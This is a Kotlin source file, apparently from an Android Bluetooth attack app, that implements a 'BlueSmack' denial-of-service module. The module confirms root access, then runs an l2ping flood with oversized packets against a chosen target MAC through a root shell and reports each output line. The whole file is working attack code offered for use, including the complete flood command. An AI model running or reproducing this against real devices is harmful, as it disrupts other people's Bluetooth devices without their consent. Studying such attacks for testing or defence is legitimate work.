package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader

/**
 * Module responsible for the BlueSmack Denial of Service (DoS) attack.
 *
 * BlueSmack sends oversized L2CAP Echo Request packets (l2ping) to the target,
 * which can cause buffer overflows in legacy or poorly implemented Bluetooth stacks.
 *
 * Root is required because l2ping uses raw L2CAP sockets, which are privileged on Android.
 * The attack is executed via the system's l2ping binary through [RootExecutor].
 */
class BlueSmackModule {

    companion object {
        private const val TAG = "BlueSmackModule"
    }

    /**
     * Checks if root access is available on this device.
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Starts the BlueSmack DoS attack by executing l2ping with oversized packets.
     *
     * The attack sends [count] L2CAP Echo Request packets of [packetSize] bytes to the
     * target device. Each response line from l2ping is emitted as a flow event.
     *
     * @param targetMac The Bluetooth MAC address of the target (e.g. "AA:BB:CC:DD:EE:FF").
     * @param packetSize The payload size in bytes for each ping (default 600, max depends on stack).
     * @param count The number of pings to send (default 1000).
     * @return A Flow of strings with each l2ping output line or error messages.
     */
    fun startAttack(
        targetMac: String,
        packetSize: Int = 600,
        count: Int = 1000
    ): Flow<String> = flow {
        emit("BlueSmack DoS: targeting $targetMac with $count packets of $packetSize bytes")

        // Verify root access
        if (!checkRoot()) {
            emit("ERROR: Root access is not available. BlueSmack requires root for raw L2CAP sockets.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if l2ping binary exists
        val whichResult = RootExecutor.execute("which l2ping")
        val l2pingAvailable = !whichResult.startsWith("Error") && whichResult.isNotBlank()

        if (!l2pingAvailable) {
            emit("WARNING: l2ping binary not found in PATH.")
            // Try alternative check to see if hcitool is at least present
            val hcitoolCheck = RootExecutor.execute("which hcitool")
            if (!hcitoolCheck.startsWith("Error") && hcitoolCheck.isNotBlank()) {
                emit("hcitool found at: ${hcitoolCheck.trim()}")
                emit("l2ping not available. Attempting HCI connectivity check as fallback...")
                val hciResult = RootExecutor.execute("hcitool cmd 0x01 0x0001")
                emit("HCI command result: $hciResult")
            } else {
                emit("ERROR: Neither l2ping nor hcitool binaries found. Cannot proceed.")
                emit("Install BlueZ utilities (l2ping) to use BlueSmack.")
            }
            return@flow
        }
        emit("l2ping binary found at: ${whichResult.trim()}")

        // Execute l2ping via a streaming root shell so we can emit output line by line
        emit("Launching: l2ping -i hci0 -s $packetSize -c $count -f $targetMac")
        val output = executel2ping(targetMac, packetSize, count)
        for (line in output) {
            emit(line)
        }
        emit("BlueSmack attack completed.")
    }

    /**
     * Executes l2ping in a root shell and collects output lines.
     *
     * We run the command through a root process and read stdout/stderr line by line.
     * This captures both the per-ping responses ("XX bytes from ... time=XXms") and
     * any error output.
     */
    private suspend fun executel2ping(
        targetMac: String,
        packetSize: Int,
        count: Int
    ): List<String> = withContext(Dispatchers.IO) {
        MacValidator.requireValid(targetMac)
        val lines = mutableListOf<String>()
        try {
            val process = Runtime.getRuntime().exec("su")
            val os = process.outputStream
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errReader = BufferedReader(InputStreamReader(process.errorStream))

            os.write("l2ping -i hci0 -s $packetSize -c $count -f $targetMac\n".toByteArray())
            os.write("exit\n".toByteArray())
            os.flush()
            os.close()

            // Read stdout line by line
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                line?.let {
                    lines.add(it)
                    Log.d(TAG, "l2ping: $it")
                }
            }

            // Read any stderr
            while (errReader.readLine().also { line = it } != null) {
                line?.let {
                    lines.add("stderr: $it")
                    Log.w(TAG, "l2ping stderr: $it")
                }
            }

            val exitCode = process.waitFor()
            if (exitCode != 0) {
                lines.add("l2ping exited with code $exitCode")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to execute l2ping", e)
            lines.add("ERROR: ${e.message ?: "Unknown error executing l2ping"}")
        }
        lines
    }
}
